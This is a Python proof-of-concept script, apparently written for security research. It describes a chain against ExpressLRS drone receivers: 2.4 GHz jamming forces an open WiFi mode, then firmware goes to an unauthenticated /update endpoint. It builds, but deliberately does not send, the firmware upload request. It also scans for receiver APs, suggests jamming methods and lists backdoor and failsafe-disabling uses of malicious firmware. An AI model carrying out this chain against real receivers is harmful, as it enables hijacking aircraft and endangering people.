#!/usr/bin/env python3
"""
ELRS Auto-WiFi Persistence Chain PoC — temporary disruption to permanent compromise

Demonstrates the attack chain where 60 seconds of 2.4 GHz disruption
forces an ELRS receiver into WiFi update mode, exposing an unauthenticated
firmware update endpoint that accepts arbitrary firmware.

Attack chain:
  1. DISRUPT:  Jam/disrupt 2.4 GHz for 60 seconds (configurable timeout)
  2. TRIGGER:  ELRS RX enters WiFi mode (auto-wifi-on-interval, default 60s)
  3. DISCOVER: RX broadcasts as AP: "ExpressLRS RX" (default SSID)
  4. CONNECT:  Attacker connects to the open WiFi AP
  5. UPLOAD:   POST firmware binary to /update endpoint (no auth check)
  6. PERSIST:  Malicious firmware is flashed — permanent compromise

The /update endpoint in ELRS WiFi mode:
  - Accepts multipart/form-data with a firmware binary
  - NO authentication (no password, no token, no signing)
  - NO firmware signature verification
  - NO rollback protection
  - Arduino-ESP32 OTA implementation (CVE-2025-53540 applies)

This PoC demonstrates:
  - WiFi mode trigger conditions and timing
  - AP discovery and connection
  - Firmware upload protocol (dry-run: constructs but does not send)
  - Chain timing analysis

It does NOT:
  - Perform any RF jamming
  - Upload actual firmware
  - Modify any device

Usage:
  # Analyze the attack chain timing
  python3 elrs-wifi-persistence-chain.py --analyze

  # Show firmware upload request construction
  python3 elrs-wifi-persistence-chain.py --show-upload

  # Scan for ELRS WiFi APs (requires WiFi interface)
  python3 elrs-wifi-persistence-chain.py --scan --interface wlan0

  # Full chain demonstration (dry-run, no actual execution)
  python3 elrs-wifi-persistence-chain.py --demo

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys
import time
from typing import Optional

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# ELRS WiFi mode constants
# ---------------------------------------------------------------------------

# Default ELRS WiFi configuration
ELRS_WIFI_SSID_DEFAULT = "ExpressLRS RX"
ELRS_WIFI_PASSWORD_DEFAULT = ""  # No password by default
ELRS_WIFI_AP_IP = "10.0.0.1"
ELRS_WIFI_UPDATE_PORT = 80
ELRS_WIFI_UPDATE_PATH = "/update"
ELRS_WIFI_INFO_PATH = "/info"

# WiFi mode trigger conditions
WIFI_AUTO_INTERVAL_DEFAULT = 60  # seconds without valid RC link
WIFI_AUTO_INTERVAL_MIN = 10
WIFI_AUTO_INTERVAL_MAX = 300

# ELRS WiFi mode HTTP endpoints
ENDPOINTS = {
    "/": "Web interface (device info, firmware upload form)",
    "/update": "Firmware upload endpoint (POST multipart/form-data)",
    "/info": "Device information JSON (hardware, version, UID)",
    "/config": "Configuration interface (binding phrase, rate, etc.)",
    "/reboot": "Reboot device",
    "/reset": "Factory reset",
    "/forceupdate": "Force firmware update mode",
}

# Known ELRS WiFi SSIDs (model-specific variations)
KNOWN_SSIDS = [
    "ExpressLRS RX",       # Default RX SSID
    "ExpressLRS TX",       # Default TX SSID
    "ExpressLRS RX AP",    # Some builds
    "ExpressLRS TX AP",    # Some builds
    "ELRS RX",             # Shortened variant
    "ELRS TX",             # Shortened variant
]


# ---------------------------------------------------------------------------
# Firmware upload request construction
# ---------------------------------------------------------------------------

def build_firmware_upload_request(
    firmware_data: bytes,
    target_ip: str = ELRS_WIFI_AP_IP,
    filename: str = "firmware.bin",
) -> dict:
    """Construct the HTTP request for firmware upload (NOT sent, analysis only).

    The ELRS WiFi update endpoint accepts a standard multipart/form-data POST
    with the firmware binary. No authentication headers, no tokens, no signing.
    """
    boundary = "----ELRSExploitBoundary"

    body_parts = []
    body_parts.append(f"--{boundary}\r\n")
    body_parts.append(
        f'Content-Disposition: form-data; name="firmware"; '
        f'filename="{filename}"\r\n'
    )
    body_parts.append("Content-Type: application/octet-stream\r\n\r\n")
    # firmware_data would go here
    body_parts.append(f"\r\n--{boundary}--\r\n")

    headers = {
        "Host": f"{target_ip}",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(
            sum(len(p.encode()) for p in body_parts) + len(firmware_data)
        ),
        "Connection": "close",
    }

    return {
        "method": "POST",
        "url": f"http://{target_ip}{ELRS_WIFI_UPDATE_PATH}",
        "headers": headers,
        "body_template": "".join(body_parts),
        "firmware_size": len(firmware_data),
        "note": "NO authentication required — endpoint accepts any firmware binary",
    }


def build_info_request(target_ip: str = ELRS_WIFI_AP_IP) -> dict:
    """Construct the HTTP request to read device info."""
    return {
        "method": "GET",
        "url": f"http://{target_ip}{ELRS_WIFI_INFO_PATH}",
        "headers": {
            "Host": target_ip,
            "Accept": "application/json",
        },
        "note": "Returns hardware ID, firmware version, UID, and config",
    }


# ---------------------------------------------------------------------------
# Attack chain analysis
# ---------------------------------------------------------------------------

CHAIN_STEPS = [
    {
        "phase": "1. DISRUPT",
        "action": "2.4 GHz RF disruption",
        "duration_s": 60,
        "description": (
            "Disrupt the 2.4 GHz band for the configured auto-wifi-on-interval "
            "(default 60 seconds). This can be achieved through:\n"
            "  - Broadband noise (simple but detectable)\n"
            "  - Targeted FHSS-following jamming (stealthier)\n"
            "  - Deauthentication of ELRS FHSS timing (protocol-aware)\n"
            "The RX counts seconds without a valid RC packet."
        ),
        "prerequisites": [
            "2.4 GHz transmit capability (e.g. HackRF, WiFi dongle in monitor mode)",
            "Proximity to target (within RF disruption range)",
        ],
        "detection": "RSSI drop visible on TX, failsafe triggers after ~1s",
    },
    {
        "phase": "2. TRIGGER",
        "action": "ELRS WiFi mode activation",
        "duration_s": 2,
        "description": (
            "After auto-wifi-on-interval seconds without a valid RC link, "
            "the ELRS receiver automatically enables its WiFi interface. "
            "This is a firmware update/configuration feature that cannot be "
            "disabled on most ELRS builds. The receiver:\n"
            "  - Stops listening for ELRS packets\n"
            "  - Starts a WiFi AP with default credentials\n"
            "  - Starts an HTTP server on port 80\n"
            "  - Exposes /update endpoint for firmware upload"
        ),
        "prerequisites": [
            "Sustained RF disruption for the full interval",
        ],
        "detection": "New WiFi AP appears (SSID: ExpressLRS RX)",
    },
    {
        "phase": "3. DISCOVER",
        "action": "WiFi AP discovery",
        "duration_s": 5,
        "description": (
            "Scan for the ELRS WiFi AP. Default SSID is 'ExpressLRS RX' "
            "(no password). The AP broadcasts on a fixed channel (usually 1). "
            "Some builds use the device's UID-derived name."
        ),
        "prerequisites": [
            "WiFi interface on attacker device",
            "Proximity (WiFi range, typically 10-50m)",
        ],
        "detection": "Standard WiFi AP visible to any scanner",
    },
    {
        "phase": "4. CONNECT",
        "action": "Connect to ELRS WiFi AP",
        "duration_s": 3,
        "description": (
            "Connect to the open WiFi AP. No password required (default). "
            "Even if a WiFi password was set, it's often left at the ELRS "
            "default or a simple value. The attacker receives an IP via DHCP "
            "(typically 10.0.0.100)."
        ),
        "prerequisites": ["WiFi AP discovered"],
        "detection": "DHCP lease visible in AP logs (if any)",
    },
    {
        "phase": "5. RECON",
        "action": "Read device info",
        "duration_s": 1,
        "description": (
            "GET /info returns JSON with hardware ID, firmware version, "
            "UID, and current configuration. This confirms the target and "
            "provides information for crafting appropriate firmware."
        ),
        "prerequisites": ["Connected to WiFi AP"],
        "detection": "HTTP request in AP logs",
    },
    {
        "phase": "6. UPLOAD",
        "action": "Flash malicious firmware",
        "duration_s": 15,
        "description": (
            "POST firmware binary to /update endpoint. No authentication, "
            "no firmware signature check, no version validation. The endpoint "
            "accepts ANY binary and flashes it to the device. Upload time "
            "depends on firmware size (~200KB typical, ~15s over WiFi).\n\n"
            "CVE-2025-53540 (Arduino-ESP32 CSRF firmware RCE) may also apply "
            "if the ELRS web interface is accessed from a browser."
        ),
        "prerequisites": [
            "Connected to WiFi AP",
            "Pre-built malicious firmware binary",
        ],
        "detection": "Firmware upload visible in device logs (cleared on flash)",
    },
    {
        "phase": "7. PERSIST",
        "action": "Permanent compromise",
        "duration_s": 5,
        "description": (
            "Device reboots with attacker's firmware. The compromise is "
            "permanent — it survives power cycles, rebinding, and normal "
            "operation. The attacker's firmware could:\n"
            "  - Backdoor the RC link (accept attacker commands)\n"
            "  - Exfiltrate telemetry/position data\n"
            "  - Inject MSP commands to the flight controller\n"
            "  - Create a covert C2 channel over ELRS telemetry\n"
            "  - Disable failsafe protections"
        ),
        "prerequisites": ["Firmware uploaded and flashed"],
        "detection": (
            "Firmware hash mismatch (if operator checks), "
            "behavioral anomalies in flight"
        ),
    },
]


def analyze_chain(wifi_interval: int = WIFI_AUTO_INTERVAL_DEFAULT):
    """Analyze the complete attack chain timing and feasibility."""
    total_time = 0

    print(f"{'=' * 70}")
    print("ELRS Auto-WiFi Persistence Attack Chain Analysis")
    print(f"{'=' * 70}")
    print(f"WiFi auto-on interval: {wifi_interval}s")
    print()

    for step in CHAIN_STEPS:
        duration = step["duration_s"]
        if step["phase"].startswith("1."):
            duration = wifi_interval  # Use actual interval
        total_time += duration

        print(f"--- {step['phase']}: {step['action']} ---")
        print(f"Duration: ~{duration}s")
        print(f"{step['description']}")
        print(f"Prerequisites:")
        for p in step["prerequisites"]:
            print(f"  - {p}")
        print(f"Detection: {step['detection']}")
        print()

    print(f"{'=' * 70}")
    print(f"TOTAL CHAIN TIME: ~{total_time}s ({total_time/60:.1f} minutes)")
    print(f"{'=' * 70}")
    print()
    print("Key observations:")
    print(f"  - {wifi_interval}s of RF disruption → permanent device compromise")
    print("  - Zero authentication at every step after WiFi mode triggers")
    print("  - No firmware signing or verification")
    print("  - Default WiFi credentials (open AP, no password)")
    print("  - Disruption is temporary; compromise is permanent")
    print("  - Attacker needs: 2.4 GHz jammer + WiFi + pre-built firmware")

    return total_time


# ---------------------------------------------------------------------------
# WiFi scanning (requires wireless tools)
# ---------------------------------------------------------------------------

def scan_for_elrs_aps(interface: str = "wlan0") -> list[dict]:
    """Scan for ELRS WiFi APs (requires iwlist or similar)."""
    import subprocess

    try:
        result = subprocess.run(
            ["iwlist", interface, "scanning"],
            capture_output=True, text=True, timeout=15
        )
        output = result.stdout

        aps = []
        current_ap = {}

        for line in output.split("\n"):
            line = line.strip()
            if line.startswith("Cell"):
                if current_ap:
                    aps.append(current_ap)
                current_ap = {"address": line.split("Address: ")[-1] if "Address: " in line else ""}
            elif "ESSID:" in line:
                ssid = line.split('ESSID:"')[-1].rstrip('"')
                current_ap["ssid"] = ssid
                current_ap["is_elrs"] = any(
                    known.lower() in ssid.lower() for known in KNOWN_SSIDS
                )
            elif "Encryption key:" in line:
                current_ap["encrypted"] = "on" in line.lower()

        if current_ap:
            aps.append(current_ap)

        return [ap for ap in aps if ap.get("is_elrs")]

    except FileNotFoundError:
        print("ERROR: iwlist not found — install wireless-tools")
        return []
    except subprocess.TimeoutExpired:
        print("ERROR: WiFi scan timed out")
        return []


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="ELRS Auto-WiFi Persistence Chain PoC"
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Analyze the full attack chain timing",
    )
    parser.add_argument(
        "--show-upload", action="store_true",
        help="Show firmware upload request construction",
    )
    parser.add_argument(
        "--scan", action="store_true",
        help="Scan for ELRS WiFi APs",
    )
    parser.add_argument(
        "--interface", default="wlan0",
        help="WiFi interface for scanning (default: wlan0)",
    )
    parser.add_argument(
        "--wifi-interval", type=int, default=WIFI_AUTO_INTERVAL_DEFAULT,
        help=f"Auto-WiFi-on interval in seconds (default: {WIFI_AUTO_INTERVAL_DEFAULT})",
    )
    parser.add_argument(
        "--demo", action="store_true",
        help="Full chain demonstration (dry-run)",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    args = parser.parse_args()

    if not any([args.analyze, args.show_upload, args.scan, args.demo]):
        args.analyze = True
        args.show_upload = True

    print("ELRS Auto-WiFi Persistence Chain PoC")
    print("Mode: ANALYSIS ONLY — no RF disruption, no firmware upload")
    print()

    output_data = {}

    if args.analyze or args.demo:
        total_time = analyze_chain(args.wifi_interval)
        output_data["chain_analysis"] = {
            "wifi_interval": args.wifi_interval,
            "total_time_s": total_time,
            "steps": CHAIN_STEPS,
        }

    if args.show_upload or args.demo:
        print(f"\n{'=' * 70}")
        print("Firmware Upload Request Construction")
        print(f"{'=' * 70}\n")

        # Demonstrate with a dummy firmware payload
        dummy_fw = b"\x00" * 1024  # 1KB placeholder
        upload_req = build_firmware_upload_request(dummy_fw)

        print(f"  Target: {upload_req['url']}")
        print(f"  Method: {upload_req['method']}")
        print(f"  Headers:")
        for k, v in upload_req["headers"].items():
            print(f"    {k}: {v}")
        print(f"  Body: multipart/form-data with firmware binary")
        print(f"  Firmware size: {upload_req['firmware_size']} bytes (placeholder)")
        print(f"  Authentication: {upload_req['note']}")
        print()

        info_req = build_info_request()
        print(f"  Recon endpoint: {info_req['url']}")
        print(f"  Method: {info_req['method']}")
        print(f"  Returns: {info_req['note']}")
        print()

        print("  Available endpoints on ELRS WiFi AP:")
        for path, desc in ENDPOINTS.items():
            print(f"    {path:<20} {desc}")

        output_data["upload_request"] = upload_req
        output_data["info_request"] = info_req
        output_data["endpoints"] = ENDPOINTS

    if args.scan:
        print(f"\n{'=' * 70}")
        print(f"Scanning for ELRS WiFi APs on {args.interface}...")
        print(f"{'=' * 70}\n")

        aps = scan_for_elrs_aps(args.interface)
        if aps:
            print(f"Found {len(aps)} ELRS AP(s):")
            for ap in aps:
                encrypted = "encrypted" if ap.get("encrypted") else "OPEN"
                print(f"  SSID: {ap.get('ssid', 'unknown')}  "
                      f"MAC: {ap.get('address', 'unknown')}  "
                      f"Security: {encrypted}")
        else:
            print("No ELRS APs found. The RX may not be in WiFi mode.")
            print("Trigger WiFi mode by disrupting the RC link for "
                  f"{args.wifi_interval}s.")

        output_data["scan_results"] = aps

    # Final assessment
    print(f"\n{'=' * 70}")
    print("VULNERABILITY ASSESSMENT")
    print(f"{'=' * 70}")
    print("  Attack class:  Temporary disruption → permanent compromise")
    print(f"  Trigger:       {args.wifi_interval}s without valid RC link")
    print("  WiFi auth:     NONE (open AP, no password by default)")
    print("  FW signing:    NONE (any binary accepted)")
    print("  FW rollback:   NONE (any version accepted)")
    print("  CVE reference: CVE-2025-53540 (Arduino-ESP32 CSRF firmware RCE)")
    print()
    print("  Impact: An attacker within WiFi range who can disrupt 2.4 GHz")
    print(f"  for {args.wifi_interval}s gains permanent firmware-level access to the")
    print("  ELRS receiver. The compromise survives power cycles and rebinding.")
    print()
    print("  TinyHawk III Plus specifics:")
    print("    - ELRS SPI RX on SX1280 (2.4 GHz only)")
    print("    - Auto-WiFi-on-interval is a build-time config")
    print("    - ELRS v4.0 drops SPI RX support → permanently locked to v3.x")
    print("    - NCC Group findings (binding phrase leak, weak FHSS RNG)")
    print("      will NEVER be patched on this hardware")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2, default=str)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
